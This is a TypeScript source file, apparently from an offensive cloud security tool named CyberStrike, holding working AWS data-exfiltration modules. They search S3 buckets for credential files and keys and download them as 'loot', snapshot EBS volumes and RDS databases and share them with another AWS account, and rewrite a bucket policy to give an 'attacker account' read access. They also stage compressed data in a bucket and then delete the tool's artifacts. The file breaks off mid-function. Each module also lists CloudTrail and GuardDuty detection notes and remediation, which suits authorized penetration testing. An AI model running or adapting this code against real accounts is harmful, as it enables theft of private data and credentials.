import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function s3Dump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")
  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"
  let regex: RegExp
  try {
    regex = new RegExp(sensitivePattern, "i")
  } catch {
    return { output: `[-] Invalid regex pattern: ${sensitivePattern}`, findings: [] }
  }

  const findings: Finding[] = []

  // Pre-flight: simulate S3 read permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["s3:ListBucket", "s3:GetObject", "s3:ListAllMyBuckets"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) findings.push({ checkId: "AWS-EXFIL-S3DUMP-001", provider: "aws", severity: "high", status: "FAIL", resource: `iam://${callerArn}`, title: `S3 dump actions permitted: ${allowed.join(", ")}`, details: `Can list and read S3 objects — sensitive file extraction possible`, remediation: "Restrict s3:GetObject and s3:ListBucket to least-privilege" })
  }

  if (bucket) {
    const r = await aws(["s3", "ls", `s3://${bucket}`, "--recursive"], profile, region, timeout)
    if (r.exitCode !== 0) return { output: `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`, findings: [] }
    const files = r.stdout.split("\n").filter((f) => regex.test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files: ${files.length}`]
    for (const f of files) output.push(`    ${f.trim()}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const key = f.trim().split(/\s+/).pop() || ""
        const dl = await aws(["s3", "cp", `s3://${bucket}/${key}`, "./s3_loot/"], profile, region, timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${key}` : `    Failed: ${key}`)
      }
    }
    output.push(`\n[*] Detection:`)
    output.push(`  CloudTrail: ListObjectsV2, GetObject, CopyObject`)
    output.push(`  GuardDuty: Exfiltration:S3/MaliciousIPCaller, Exfiltration:S3/AnomalousBehavior`)
    return { output: output.join("\n"), findings }
  }

  const r = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] Cannot list buckets: ${r.stderr.trim()}`, findings }
  const buckets = tryJson(r.stdout) || []
  const output = [`[*] Found ${buckets.length} bucket(s)\n`]

  for (const b of buckets) {
    const lr = await aws(["s3", "ls", `s3://${b}`, "--recursive"], profile, region, timeout)
    if (lr.exitCode !== 0) {
      output.push(`[-] ${b}: access denied`)
      continue
    }
    const files = lr.stdout.split("\n").filter((f) => regex.test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f.trim()}`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListBuckets, ListObjectsV2, GetObject, CopyObject`)
  output.push(`  GuardDuty: Exfiltration:S3/MaliciousIPCaller, Exfiltration:S3/AnomalousBehavior`)
  output.push(`  Note: S3 data events (GetObject) require a separate CloudTrail data-event trail`)
  return { output: output.join("\n"), findings }
}

export async function ec2Snapshot(args: string[], timeout: number): Promise<HookResult> {
  const volumeId = argVal(args, "--volume-id")
  const shareAccount = argVal(args, "--share-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!volumeId) return { output: "ERROR: --volume-id required", findings: [] }

  const findings: Finding[] = []

  // Pre-flight: simulate snapshot + sharing permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["ec2:CreateSnapshot", "ec2:ModifySnapshotAttribute", "ec2:CopySnapshot"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) findings.push({ checkId: "AWS-EXFIL-EC2SNAP-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `EC2 snapshot exfil actions permitted: ${allowed.join(", ")}`, details: `Can create snapshots and share cross-account for data exfiltration`, remediation: "Restrict ec2:CreateSnapshot and ec2:ModifySnapshotAttribute via IAM/SCP" })
  }

  const r = await aws(
    [
      "ec2",
      "create-snapshot",
      "--volume-id",
      volumeId,
      "--description",
      "CyberStrike forensic snapshot",
      "--tag-specifications",
      "ResourceType=snapshot,Tags=[{Key=CreatedBy,Value=CyberStrike}]",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }
  const snap = tryJson(r.stdout)
  const output = [`[+] Snapshot created: ${snap?.SnapshotId}`, `    Volume: ${volumeId}`, `    State: ${snap?.State}`]

  if (shareAccount) {
    const sr = await aws(
      [
        "ec2",
        "modify-snapshot-attribute",
        "--snapshot-id",
        snap?.SnapshotId,
        "--attribute",
        "createVolumePermission",
        "--operation-type",
        "add",
        "--user-ids",
        shareAccount,
      ],
      profile,
      region,
      timeout,
    )
    output.push(
      sr.exitCode === 0 ? `[+] Shared with account: ${shareAccount}` : `[-] Sharing failed: ${sr.stderr.trim()}`,
    )
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: CreateSnapshot, ModifySnapshotAttribute, CopySnapshot`)
  output.push(`  GuardDuty: Exfiltration:S3/MaliciousIPCaller (cross-account share)`)
  output.push(`  Note: Snapshot creation + cross-account share is VERY high-signal — commonly alerted`)
  return { output: output.join("\n"), findings }
}

export async function rdsDump(args: string[], timeout: number): Promise<HookResult> {
  const dbId = argVal(args, "--db-identifier")
  const shareAccount = argVal(args, "--share-account")
  const restore = hasFlag(args, "--restore")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []

  // Pre-flight: simulate RDS snapshot + share permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["rds:CreateDBSnapshot", "rds:ModifyDBSnapshotAttribute", "rds:RestoreDBInstanceFromDBSnapshot", "rds:CopyDBSnapshot"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) findings.push({ checkId: "AWS-EXFIL-RDS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `RDS exfil actions permitted: ${allowed.join(", ")}`, details: `Can snapshot, share, and restore databases — full data exfiltration possible`, remediation: "Restrict rds:CreateDBSnapshot and rds:ModifyDBSnapshotAttribute to admin roles" })
  }

  if (!dbId) {
    const r = await aws(
      [
        "rds",
        "describe-db-instances",
        "--query",
        "DBInstances[].[DBInstanceIdentifier,Engine,DBInstanceStatus,Endpoint.Address]",
      ],
      profile,
      region,
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot list RDS instances: ${r.stderr.trim()}`, findings }
    const dbs = tryJson(r.stdout) || []
    const output = [`[*] RDS Instances: ${dbs.length}\n`]
    for (const db of dbs) output.push(`    ${db[0]} (${db[1]}) — ${db[2]} — ${db[3] || "no endpoint"}`)
    output.push("\n[*] Use --db-identifier to create a snapshot")
    return { output: output.join("\n"), findings }
  }

  const output = [`[*] RDS Snapshot — target: ${dbId}\n`]
  const snapId = `cs-snap-${Date.now()}`
  const r = await aws(
    [
      "rds",
      "create-db-snapshot",
      "--db-instance-identifier",
      dbId,
      "--db-snapshot-identifier",
      snapId,
      "--tags",
      "Key=CreatedBy,Value=CyberStrike",
    ],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] Snapshot failed: ${r.stderr.trim()}`, findings }

  output.push(`[+] Snapshot created: ${snapId}`)
  output.push(`[*] Waiting for snapshot to become available...`)

  const wait = await aws(
    ["rds", "wait", "db-snapshot-available", "--db-snapshot-identifier", snapId],
    profile,
    region,
    timeout,
  )
  if (wait.exitCode === 0) output.push(`[+] Snapshot available`)

  findings.push({
    checkId: "AWS-RDS-004",
    provider: "aws",
    severity: "critical",
    status: "EXTRACTED",
    resource: `rds:${dbId}`,
    title: `RDS snapshot created: ${snapId}`,
    details: `Snapshot of ${dbId} created for data extraction`,
    remediation: "Delete snapshot after engagement: aws rds delete-db-snapshot",
  })

  if (shareAccount) {
    const sr = await aws(
      [
        "rds",
        "modify-db-snapshot-attribute",
        "--db-snapshot-identifier",
        snapId,
        "--attribute-name",
        "restore",
        "--values-to-add",
        shareAccount,
      ],
      profile,
      region,
      timeout,
    )
    if (sr.exitCode === 0) {
      output.push(`[+] Snapshot shared with account: ${shareAccount}`)
      findings.push({
        checkId: "AWS-RDS-005",
        provider: "aws",
        severity: "critical",
        status: "SHARED",
        resource: `rds:${snapId}`,
        title: `RDS snapshot shared cross-account: ${shareAccount}`,
        details: `Snapshot ${snapId} shared with AWS account ${shareAccount}`,
        remediation: "Revoke sharing after extraction",
      })
    } else {
      output.push(`[-] Sharing failed: ${sr.stderr.trim()}`)
    }
  }

  if (restore) {
    const restoreId = `cs-restore-${Date.now()}`
    const rr = await aws(
      [
        "rds",
        "restore-db-instance-from-db-snapshot",
        "--db-instance-identifier",
        restoreId,
        "--db-snapshot-identifier",
        snapId,
        "--db-instance-class",
        "db.t3.micro",
        "--tags",
        "Key=CreatedBy,Value=CyberStrike",
      ],
      profile,
      region,
      timeout,
    )
    if (rr.exitCode === 0) {
      output.push(`[+] Restoring snapshot to instance: ${restoreId}`)
      output.push(`[*] Wait for instance, then connect and extract data`)
    } else {
      output.push(`[-] Restore failed: ${rr.stderr.trim()}`)
    }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: CreateDBSnapshot, ModifyDBSnapshotAttribute, RestoreDBInstanceFromDBSnapshot`)
  output.push(`  Note: RDS snapshot creation + cross-account share is high-signal — monitored by AWS Config rules`)
  return { output: output.join("\n"), findings }
}

export async function dynamodbDump(args: string[], timeout: number): Promise<HookResult> {
  const tableName = argVal(args, "--table-name")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const limit = argVal(args, "--limit") || "100"
  const output: string[] = ["[*] DynamoDB Data Extraction\n"]
  const findings: Finding[] = []

  // Pre-flight: simulate DynamoDB read permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["dynamodb:Scan", "dynamodb:GetItem", "dynamodb:BatchGetItem", "dynamodb:ExportTableToPointInTime"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) {
      output.push(`[!] DynamoDB exfil actions allowed: ${allowed.join(", ")}`)
      findings.push({ checkId: "AWS-EXFIL-DDB-001", provider: "aws", severity: "high", status: "FAIL", resource: `iam://${callerArn}`, title: `DynamoDB read/export actions permitted: ${allowed.length}`, details: `Allowed: ${allowed.join(", ")} — full table scan and export possible`, remediation: "Restrict dynamodb:Scan and ExportTableToPointInTime to application roles only" })
    }
  }

  if (!tableName) {
    const tables = await aws(["dynamodb", "list-tables", "--query", "TableNames"], profile, region, timeout)
    if (tables.exitCode !== 0) return { output: `[-] Cannot list tables: ${tables.stderr.trim()}`, findings }
    const tl = tryJson(tables.stdout) || []
    output.push(`[+] DynamoDB Tables: ${tl.length}\n`)

    for (const t of tl) {
      const desc = await aws(
        [
          "dynamodb",
          "describe-table",
          "--table-name",
          t,
          "--query",
          "Table.[TableName,ItemCount,TableSizeBytes,TableStatus,SSEDescription.Status]",
        ],
        profile,
        region,
        timeout,
      )
      if (desc.exitCode === 0) {
        const d = tryJson(desc.stdout)
        const sizeKb = Math.round((d?.[2] || 0) / 1024)
        output.push(
          `    ${d?.[0]} — ${d?.[1]} items — ${sizeKb}KB — ${d?.[3]}${d?.[4] === "ENABLED" ? "" : " [NO SSE]"}`,
        )
      }
    }
    output.push("\n[*] Use --table-name TABLE to scan/dump data")
    return { output: output.join("\n"), findings }
  }

  output.push(`[*] Scanning table: ${tableName} (limit: ${limit})\n`)

  const scan = await aws(
    ["dynamodb", "scan", "--table-name", tableName, "--max-items", limit, "--output", "json"],
    profile,
    region,
    timeout,
  )
  if (scan.exitCode !== 0) {
    output.push(`[-] Scan failed: ${scan.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const result = tryJson(scan.stdout)
  const items = result?.Items || []
  const count = result?.Count || 0
  const scannedCount = result?.ScannedCount || 0

  output.push(`[+] Items returned: ${count} (scanned: ${scannedCount})`)

  for (const item of items.slice(0, 20)) {
    const flat = Object.entries(item)
      .map(([k, v]) => {
        const val = v as Record<string, string>
        return `${k}=${val.S || val.N || val.BOOL || "[complex]"}`
      })
      .join(", ")
    output.push(`    ${flat.slice(0, 120)}${flat.length > 120 ? "..." : ""}`)
  }

  if (count > 20) output.push(`    ... and ${count - 20} more items`)

  const secrets = JSON.stringify(items).match(/(password|secret|key|token|api_key|private_key)/gi) || []
  if (secrets.length > 0) {
    output.push(`\n    [!] Potential secrets found: ${[...new Set(secrets)].join(", ")}`)
    findings.push({
      checkId: "AWS-EXFIL-001",
      provider: "aws",
      severity: "critical",
      status: "EXTRACTED",
      resource: `dynamodb:${tableName}`,
      title: `DynamoDB data with secrets: ${tableName}`,
      details: `${count} items extracted, potential secrets: ${[...new Set(secrets)].join(",")}`,
      remediation: "Review table data for sensitive information, enable SSE",
    })
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: Scan, DescribeTable, ExportTableToPointInTime`)
  output.push(`  Note: Full table Scan on large tables generates high read capacity — may trigger alarms`)
  return { output: output.join("\n"), findings }
}

export async function ebsDirectRead(args: string[], timeout: number): Promise<HookResult> {
  const snapshotId = argVal(args, "--snapshot-id")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] EBS Direct API Snapshot Read\n"]
  const findings: Finding[] = []

  // Pre-flight: simulate EBS direct read permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["ebs:ListSnapshotBlocks", "ebs:GetSnapshotBlock", "ebs:ListChangedBlocks"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) {
      output.push(`[!] EBS Direct API actions allowed: ${allowed.join(", ")}`)
      findings.push({ checkId: "AWS-EXFIL-EBS-001", provider: "aws", severity: "critical", status: "FAIL", resource: `iam://${callerArn}`, title: `EBS Direct API access permitted — block-level snapshot read`, details: `Allowed: ${allowed.join(", ")} — can read raw disk data without mounting`, remediation: "Restrict ebs:GetSnapshotBlock and ebs:ListSnapshotBlocks — these APIs are rarely needed" })
    }
  }

  if (!snapshotId) {
    const snaps = await aws(
      [
        "ec2",
        "describe-snapshots",
        "--owner-ids",
        "self",
        "--query",
        "Snapshots[].[SnapshotId,VolumeId,VolumeSize,State,Description]",
        "--max-items",
        "50",
      ],
      profile,
      region,
      timeout,
    )
    if (snaps.exitCode === 0) {
      const sl = tryJson(snaps.stdout) || []
      output.push(`[+] Available Snapshots: ${sl.length}`)
      for (const s of sl) output.push(`    ${s[0]} — vol: ${s[1]} — ${s[2]}GB — ${s[3]} — ${s[4] || ""}`)
    }
    output.push("\n[*] Use --snapshot-id to read snapshot blocks via EBS Direct API")
    output.push("[*] EBS Direct API reads block-level data without mounting (no EC2 needed)")
    return { output: output.join("\n"), findings }
  }

  const blocks = await aws(
    ["ebs", "list-snapshot-blocks", "--snapshot-id", snapshotId, "--max-results", "100"],
    profile,
    region,
    timeout,
  )
  if (blocks.exitCode !== 0) {
    output.push(`[-] Cannot list blocks: ${blocks.stderr.trim()}`)
    output.push("[*] EBS Direct API may require specific permissions: ebs:ListSnapshotBlocks, ebs:GetSnapshotBlock")
    return { output: output.join("\n"), findings }
  }

  const result = tryJson(blocks.stdout)
  const blockList = result?.Blocks || []
  const volumeSize = result?.VolumeSize
  const blockSize = result?.BlockSize

  output.push(`[+] Snapshot: ${snapshotId}`)
  output.push(`    Volume size: ${volumeSize}GB, Block size: ${blockSize} bytes`)
  output.push(`    Blocks (first 100): ${blockList.length}`)

  findings.push({
    checkId: "AWS-EXFIL-002",
    provider: "aws",
    severity: "high",
    status: "ACCESSED",
    resource: `ebs:${snapshotId}`,
    title: `EBS snapshot blocks listed: ${snapshotId}`,
    details: `${blockList.length} blocks accessible, ${volumeSize}GB volume`,
    remediation: "Review ebs:ListSnapshotBlocks and ebs:GetSnapshotBlock permissions",
  })

  output.push(
    `\n[*] To read block data: aws ebs get-snapshot-block --snapshot-id ${snapshotId} --block-index <INDEX> --block-token <TOKEN>`,
  )
  output.push("[*] Block data can be reassembled into a raw disk image for offline analysis")

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: ListSnapshotBlocks, GetSnapshotBlock, ListChangedBlocks`)
  output.push(`  Note: EBS Direct API usage is VERY unusual — high-signal for forensic/exfil activity`)
  return { output: output.join("\n"), findings }
}

export async function s3Exfil(args: string[], timeout: number): Promise<HookResult> {
  const bucket = argVal(args, "--bucket")
  const externalAccount = argVal(args, "--external-account")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] S3 Bucket Policy Exfiltration\n"]
  const findings: Finding[] = []

  if (!bucket) return { output: "ERROR: --bucket required", findings }
  if (!externalAccount) return { output: "ERROR: --external-account required (attacker account ID)", findings }

  // Pre-flight: simulate bucket policy modification
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["s3:PutBucketPolicy", "s3:GetBucketPolicy", "s3:DeleteBucketPolicy"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    output.push(`[+] Bucket policy actions: ${allowed.length}/${actions.length} allowed`)
    if (allowed.some((a: string) => a === "s3:PutBucketPolicy")) output.push(`[!] s3:PutBucketPolicy ALLOWED — can grant external account access`)
  }

  const existing = await aws(["s3api", "get-bucket-policy", "--bucket", bucket], profile, region, timeout)
  let doc: Record<string, unknown> = { Version: "2012-10-17", Statement: [] }
  if (existing.exitCode === 0) {
    doc = tryJson(tryJson(existing.stdout)?.Policy || "{}") || doc
  }

  output.push(`[*] Current policy: ${(doc.Statement as unknown[])?.length || 0} statement(s)`)

  const newStatement = {
    Sid: "CyberStrikeExfil",
    Effect: "Allow",
    Principal: { AWS: `arn:aws:iam::${externalAccount}:root` },
    Action: ["s3:GetObject", "s3:ListBucket"],
    Resource: [`arn:aws:s3:::${bucket}`, `arn:aws:s3:::${bucket}/*`],
  }

  ;(doc.Statement as unknown[]).push(newStatement)

  const put = await aws(
    ["s3api", "put-bucket-policy", "--bucket", bucket, "--policy", JSON.stringify(doc)],
    profile,
    region,
    timeout,
  )

  if (put.exitCode === 0) {
    output.push(`\n[+] Bucket policy modified — external account ${externalAccount} granted read access`)
    output.push(`\n[*] From attacker account:`)
    output.push(`    aws s3 ls s3://${bucket} --recursive`)
    output.push(`    aws s3 sync s3://${bucket} ./loot/`)
    findings.push({
      checkId: "AWS-EXFIL-003",
      provider: "aws",
      severity: "critical",
      status: "MODIFIED",
      resource: `s3:${bucket}`,
      title: `S3 bucket policy modified for exfil: ${bucket}`,
      details: `External account ${externalAccount} granted s3:GetObject and s3:ListBucket`,
      remediation: "Remove CyberStrikeExfil statement from bucket policy",
    })
  } else {
    output.push(`[-] Policy modification failed: ${put.stderr.trim()}`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: PutBucketPolicy, GetBucketPolicy, DeleteBucketPolicy`)
  output.push(`  GuardDuty: Policy:S3/BucketAnonymousAccessGranted, Exfiltration:S3/AnomalousBehavior`)
  output.push(`  Note: Bucket policy modification is EXTREMELY high-signal — S3 Access Analyzer will flag immediately`)
  return { output: output.join("\n"), findings }
}

export async function dataStage(args: string[], timeout: number): Promise<HookResult> {
  const sourcePath = argVal(args, "--source")
  const destBucket = argVal(args, "--dest-bucket")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const compress = !hasFlag(args, "--no-compress")
  const output: string[] = ["[*] Data Staging\n"]
  const findings: Finding[] = []

  if (!sourcePath) return { output: "ERROR: --source required (local path or s3://)", findings }
  if (!destBucket) return { output: "ERROR: --dest-bucket required (staging bucket)", findings }

  // Pre-flight: simulate S3 write for staging
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["s3:PutObject", "s3:CopyObject", "s3:GetObject"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    if (allowed.length > 0) output.push(`[+] Staging permissions: ${allowed.join(", ")}`)
  }

  if (sourcePath.startsWith("s3://")) {
    output.push(`[*] Source: ${sourcePath} (S3)`)
    output.push(`[*] Destination: s3://${destBucket}/staged/`)

    const r = await aws(["s3", "sync", sourcePath, `s3://${destBucket}/staged/`, "--quiet"], profile, region, timeout)
    if (r.exitCode === 0) {
      output.push(`[+] Data staged to s3://${destBucket}/staged/`)
    } else {
      output.push(`[-] Staging failed: ${r.stderr.trim()}`)
    }
  } else {
    output.push(`[*] Source: ${sourcePath} (local)`)

    if (compress) {
      const archiveName = `staged-${Date.now()}.tar.gz`
      output.push(`[*] Compressing to ${archiveName}...`)

      const { run } = await import("./shared")
      const tar = await run("tar", ["-czf", archiveName, sourcePath], timeout)
      if (tar.exitCode !== 0) {
        output.push(`[-] Compression failed: ${tar.stderr.trim()}`)
        return { output: output.join("\n"), findings }
      }

      const upload = await aws(
        ["s3", "cp", archiveName, `s3://${destBucket}/staged/${archiveName}`],
        profile,
        region,
        timeout,
      )
      if (upload.exitCode === 0) {
        output.push(`[+] Staged: s3://${destBucket}/staged/${archiveName}`)
      } else {
        output.push(`[-] Upload failed: ${upload.stderr.trim()}`)
      }
    } else {
      const upload = await aws(
        ["s3", "sync", sourcePath, `s3://${destBucket}/staged/`, "--quiet"],
        profile,
        region,
        timeout,
      )
      if (upload.exitCode === 0) {
        output.push(`[+] Data staged to s3://${destBucket}/staged/`)
      } else {
        output.push(`[-] Staging failed: ${upload.stderr.trim()}`)
      }
    }
  }

  findings.push({
    checkId: "AWS-EXFIL-004",
    provider: "aws",
    severity: "critical",
    status: "STAGED",
    resource: `s3:${destBucket}`,
    title: `Data staged to: ${destBucket}`,
    details: `Data from ${sourcePath} staged to s3://${destBucket}/staged/`,
    remediation: "Delete staged data and review bucket access logs",
  })

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: PutObject, CopyObject, CompleteMultipartUpload`)
  output.push(`  Note: Large data transfers to staging bucket generate S3 data events + VPC flow logs`)
  return { output: output.join("\n"), findings }
}

export async function cleanupAws(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const dryRun = hasFlag(args, "--dry-run")
  const mode = dryRun ? "DRY RUN" : "LIVE"
  const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]
  const findings: Finding[] = []

  // Pre-flight: simulate cleanup permissions
  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  const callerArn = (tryJson(id.stdout) || {}).Arn || ""
  if (callerArn) {
    const actions = ["ec2:DeleteSnapshot", "rds:DeleteDBSnapshot", "lambda:DeleteFunction", "iam:DeleteUser", "iam:DeleteRole", "cloudformation:DeleteStack"]
    const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
    const results = tryJson(sim.stdout)?.EvaluationResults || []
    const allowed = results.filter((r: Record<string, string>) => r.EvalDecision === "allowed").map((r: Record<string, string>) => r.EvalActionName)
    const denied = results.filter((r: Record<string, string>) => r.EvalDecision !== "allowed").map((r: Record<string, string>) => r.EvalActionName)
    output.push(`[+] Cleanup permissions: ${allowed.length} allowed, ${denied.length} denied`)
    if (denied.length > 0) output.push(`[!] Cannot clean: ${denied.join(", ")}`)
  }

  const snaps = await aws(
    [
      "ec2",
      "describe-snapshots",
      "--owner-ids",
      "self",
      "--filters",
      "Name=tag:CreatedBy,Values=CyberStrike",
      "--query",
      "Snapshots[].SnapshotId",
    ],
    profile,
    region,
    timeout,
  )
  if (snaps.exitCode === 0) {
    const snapList = tryJson(snaps.stdout) || []
    output.push(`[+] Snapshots to clean: ${snapList.length}`)
    for (const s of snapList) {
      if (dryRun) {
        output.push(`    Would delete: ${s}`)
      } else {
        await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
        output.push(`    Deleted: ${s}`)
      }
    }
  }

  const rdsSnaps = await aws(
    [
      "rds",
      "describe-db-snapshots",
      "--query",
      "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]",
    ],
    profile,
    region,
    timeout,
  )
  if (rdsSnaps.exitCode === 0) {
    const rdsList = tryJson(rdsSnaps.stdout) || []
    output.push(`[+] RDS snapshots to clean: ${rdsList.length}`)
    for (const s of rdsList) {
      const snapId = s[0]
      if (dryRun) {
        output.push(`    Would delete: ${snapId}`)
      } else {
        await aws(["rds", "delete-db-snapshot", "--db-snapshot-identifier", snapId], profile, region, timeout)
        output.push(`    Deleted: ${snapId}`)
      }
    }
  }

  const lambdas = await aws(
    ["lambda", "list-functions", "--query", "Functions[?contains(FunctionName,'cs-')].[FunctionName]"],
    profile,
    region,
    timeout,
  )
  if (lambdas.exitCode === 0) {
    const ll = tryJson(lambdas.stdout) || []
    output.push(`[+] Lambda functions to clean: ${ll.length}`)
    for (const l of ll) {
      if (dryRun) {
        output.push(`    Would delete: ${l[0]}`)
      } else {
        await aws(["lambda", "delete-function", "--function-name", l[0]], profile, region, timeout)
        output.push(`    Deleted: ${l[0]}`)
      }
    }
  }

  const users = await aws(
    ["iam", "list-users", "--query", "Users[?contains(UserName,'cs-')].[UserName]"],
    profile,
    region,
    timeout,
  )
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`[+] IAM users to clean: ${ul.length}`)
    for (const u of ul) {
      if (dryRun) {
        output.push(`    Would delete: ${u[0]}`)
      } else {
        const keys = await aws(
          ["iam", "list-access-keys", "--user-name", u[0], "--query", "AccessKeyMetadata[].AccessKeyId"],
          profile,
          region,
          timeout,
        )
        for (const k of tryJson(keys.stdout) || []) {
          await aws(["iam", "delete-access-key", "--user-name", u[0], "--access-key-id", k], profile, region, timeout)
        }
        await aws(["iam", "delete-login-profile", "--user-name", u[0]], profile, region, timeout)
        const policies = await aws(
          ["iam", "list-attached-user-policies", "--user-name", u[0], "--query", "AttachedPolicies[].PolicyArn"],
          profile,
          region,
          timeout,
        )
        for (const p of tryJson(policies.stdout) || []) {
          await aws(["iam", "detach-user-policy", "--user-name", u[0], "--policy-arn", p], profile, region, timeout)
        }
        await aws(["iam", "delete-user", "--user-name", u[0]], profile, region, timeout)
        output.push(`    Deleted: ${u[0]}`)
      }
    }
  }

  const roles = await aws(
    ["iam", "list-roles", "--query", "Roles[?contains(RoleName,'cs-')].[RoleName]"],
    profile,
    region,
    timeout,
  )
  if (roles.exitCode === 0) {
    const rl = tryJson(roles.stdout) || []
    output.push(`[+] IAM roles to clean: ${rl.length}`)
    for (const r of rl) {
      if (dryRun) {
        output.push(`    Would delete: ${r[0]}`)
      } else {
        const policies = await aws(
          ["iam", "list-attached-role-policies", "--role-name", r[0], "--query", "AttachedPolicies[].PolicyArn"],
          profile,
          region,
          timeout,
        )
        for (const p of tryJson(policies.stdout) || []) {
          await aws(["iam", "detach-role-policy", "--role-name", r[0], "--policy-arn", p], profile, region, timeout)
        }
        await aws(["iam", "delete-role", "--role-name", r[0]], profile, region, timeout)
        output.push(`    Deleted: ${r[0]}`)
      }
    }
  }

  const cfnStacks = await aws(
    [
      "cloudformation",
      "list-stacks",
      "--stack-status-filter",
      "CREATE_COMPLETE",
      "UPDATE_COMPLETE",
      "--query",
      "StackSummaries[?contains(StackName,'cs-')].[StackName]",
    ],
    profile,
    region,
    timeout,
  )
